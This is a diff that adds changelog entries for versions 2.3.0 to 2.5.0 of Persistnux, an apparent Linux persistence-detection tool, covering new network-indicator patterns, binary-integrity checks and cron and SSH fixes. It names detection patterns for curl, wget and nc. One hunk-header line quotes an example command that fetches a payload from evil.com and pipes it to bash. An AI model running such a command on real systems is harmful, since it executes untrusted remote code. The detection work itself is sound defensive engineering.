@@ -5,6 +5,112 @@ All notable changes to Persistnux will be documented in this file.
 The format is based on [Keep a Changelog](https://keepachangelog.com/en/1.0.0/),
 and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0.html).
 
+## [2.5.0] - 2026-03-10
+
+### Added
+
+**Network indicator detection (`check_network_indicators`)**
+- New `NETWORK_INDICATOR_PATTERNS` array with four indicator classes:
+  1. Hardcoded non-RFC1918 IPs in network tool calls (`curl`/`wget`/`nc`/etc.)
+  2. Suspicious TLDs in download URLs (`.ru`, `.cn`, `.onion`, `.tk`, `.xyz`, `.top`, `.pw`, `.cc`, `.biz`)
+  3. DGA-like long subdomains (16+ char single label) in download contexts
+  4. Hex-encoded IP byte sequences (`\xNN\xNN\xNN\xNN`) in any content
+- New `check_network_indicators()` function with RFC1918/loopback exclusion for IP checks
+- Integrated into `check_suspicious_patterns()` as "indicator" category — applies automatically to ALL content: scripts, systemd `ExecStart=`, crontab commands, PAM exec directives, config files
+- `UNIFIED_SUSPICIOUS_PATTERN` updated to include `COMBINED_NETWORK_INDICATOR_PATTERN` for `quick_suspicious_check()` coverage
+
+### Changed
+
+**Binary integrity — scope-first + parallel (2–10× faster)**
+- Replaced full `dpkg -V` / `rpm -Va` (all packages, ~30–120s) with scoped approach:
+  - `find | xargs dpkg -S` / `find | xargs rpm -qf` identifies only packages owning files in `/usr/bin`, `/usr/sbin`, `/bin`, `/sbin`, and PAM security module directories
+  - `xargs -P4 dpkg --verify` / `xargs -P4 rpm -V` verifies only those ~50–100 packages in parallel
+  - Reduces typical wall time from 30–120s to ~3–10s
+
+### Removed
+
+**Time-based anomaly elevations (8 locations)**
+- Removed `days_old < 7` confidence elevation from: systemd services, cron script dirs, system shell profiles, profile.d scripts, root user profiles, non-root user profiles, SSH authorized_keys
+- Removed `days_old < 30` time-gate from web shell detection; now content-gated only (reports only files with actual webshell patterns)
+- `days_old` field preserved in all findings for informational reference — no behavioral change to finding output structure
+
+## [2.4.0] - 2026-03-10
+
+### Added
+
+**Sub-check progress numbering**
+- Added `log_check()` function: increments `CHECK_NUM` global counter and prints `[CHECK N] description` for every individual persistence check
+- All 37 sub-checks across modules 1–9 now labeled individually in terminal output — operators can see exactly which check is running
+
+**Module 9: Binary Integrity (`check_binary_integrity`)**
+- New module `[9/9]` using `dpkg -V` (Debian/Ubuntu) and `rpm -Va` (RHEL/CentOS) to verify integrity of installed system binaries
+- Modified files in `/usr/bin`, `/usr/sbin`, `/bin`, `/sbin` → CRITICAL finding with `matched_pattern=modified_system_binary`
+- Modified PAM modules in `/lib/security` paths → CRITICAL finding
+- dpkg conffiles (marked with ` c `) skipped to eliminate false positives
+- No package manager found → `log_warn` and skip
+- Module count updated from 8→9 throughout script, report template, help text, and docs
+
+### Removed
+
+**nsswitch persistence check**
+- Removed nsswitch.conf / libnss_*.so module scanning from `check_additional_persistence` — too niche for general DFIR use, generates false positives on standard systems
+
+## [2.3.0] - 2026-03-09
+
+### Fixed — 19 Code Review Issues
+
+Nineteen issues across bugs, detection gaps, optimizations, and other problems addressed.
+
+**Global / Utility**
+- **Trap cleanup**: Added `trap 'rm -rf "${TEMP_DATA:-}"' EXIT INT TERM HUP` — temp directory now removed on all exit paths
+- **Local pip runtime-managed**: Added `~/.local/lib/python*/site-packages/` and `~/.local/share/virtualenvs/` to `is_package_managed()` runtime-managed paths — Python venv packages no longer reported as unmanaged
+- **escape_json control chars**: `escape_json()` now strips ASCII control characters 0x00–0x1F (excluding `\n`, `\t`, `\r` already handled) using `tr -d` — prevents invalid JSON from filenames with embedded control bytes
+
+**check_systemd**
+- **uid filter**: Changed `uid -ge 0` to `uid -ge 1000 || uid -eq 0` in user service directory scan — service accounts (UID 1–999) no longer scanned
+- **OnFailure= detection**: Each `.service` file's `OnFailure=` directive now extracted and cross-checked; OnFailure referencing an unmanaged or missing service unit → HIGH finding
+- **.path unit scanning**: `.path` files now scanned in the same pass as generator units; unmanaged .path file → HIGH; content analyzed for suspicious `ExecStart` commands
+
+**check_cron**
+- **head limit raised**: `/etc/crontab` and `/etc/cron.d` per-file analysis increased from `head -20` to `head -200` — longer crontabs no longer truncated
+- **symlinks included**: `find` in `/etc/cron.d` changed to `( -type f -o -type l )` — symlink-based cron entries no longer silently skipped
+- **uid filter**: Changed `uid -ge 0` to `uid -ge 1000 || uid -eq 0` in user crontab loop
+- **at-job hidden detection**: Old substring match `[[ "$spool_name" == *"$known_id"* ]]` replaced with boundary-aware regex `grep -qE "(^|[^0-9])0*${known_id}([^0-9]|$)"` — prevents job ID "1" from matching spool filename "a10"
+- **cron.allow/cron.deny scanning**: `/etc/cron.allow` and `/etc/cron.deny` are now scanned; entries referencing nonexistent users → MEDIUM; unexpected allow list → reported
+
+**check_shell_profiles**
+- **uid filter**: Changed `uid -ge 0` to `uid -ge 1000 || uid -eq 0` in user profile scan loop
+
+**check_init_scripts**
+- **symlinks included**: `find` in `/etc/init.d` changed to `( -type f -o -type l )` — init.d symlinks no longer skipped
+
+**check_additional_persistence**
+- **XDG uid filter**: `/etc/passwd` loop now extracts UID and skips service accounts (uid < 1000 and uid ≠ 0)
+- **nsswitch.conf scanning**: `/etc/nsswitch.conf` is now passed to `is_package_managed()`; referenced NSS service names are resolved to `libnss_*.so.2` libraries and verified; unmanaged or modified libraries → HIGH
+
+**check_common_backdoors**
+- **uid filter**: Changed `uid -ge 0` to `uid -ge 1000 || uid -eq 0` in gitconfig user scan
+- **Shell-native file read**: Replaced `$(cat "$gitconfig")` with `$(<"$gitconfig")` — avoids spawning a subprocess
+
+**check_common_backdoors — web shells**
+- **100-file cap warning**: When the 100-file scan limit is reached, a `log_warn` message is now emitted so analysts know the scan was capped
+
+### Added — New Detection Module: check_ssh_persistence [8/8]
+
+New function `check_ssh_persistence()` added between module 7 and `main()`:
+
+- **authorized_keys per user**: All user homes (UID ≥ 1000 + root) scanned for `~/.ssh/authorized_keys`; recently modified keys → HIGH; keys with `command=` option analyzed for suspicious content
+- **~/.ssh/rc per user**: All user homes scanned for `~/.ssh/rc`; presence flagged MEDIUM; suspicious content → HIGH; NEVER_WHITELIST patterns → CRITICAL
+- Called from `main()` as detection step [8/8]
+
+### Changed
+
+- **MIN_CONFIDENCE validation**: `CRITICAL` is now accepted as a valid `MIN_CONFIDENCE` value (previously caused a warning and fallback to MEDIUM)
+- **Exit code on CRITICAL**: Script now exits with code 1 when any CRITICAL findings are present — enables CI/CD integration and automated alerting
+- **Module progress labels**: All `[X/7]` labels updated to `[X/8]`; report summary updated to reflect 8 detection modules
+
+---
+
 ## [2.2.0] - 2026-03-06
 
 ### Added — Kernel/Preload Depth Expansion
@@ -625,6 +731,7 @@ curl -s http://evil.com/payload | base64 -d | bash
 
 ## Version History Summary
 
+- **v2.3.0**: 19 code review fixes — SSH module, OnFailure=, .path units, cron.allow/deny, nsswitch, at-job boundary fix, uid≥1000 filter, trap cleanup, escape_json control chars
 - **v2.2.0**: Kernel/preload depth — modprobe.d coverage, ld.so.conf.d .so scan, /etc/environment LD_PRELOAD library verification, modules-load.d .ko verification
 - **v2.1.0**: PAM comprehensive overhaul — 16 gaps fixed, relay detection, @include following, /etc/security/ scan
 - **v2.0.0**: 13 detection bug fixes — cron field extraction, timer-activated services, service accounts, location checks, sudoers analysis, env -S evasion
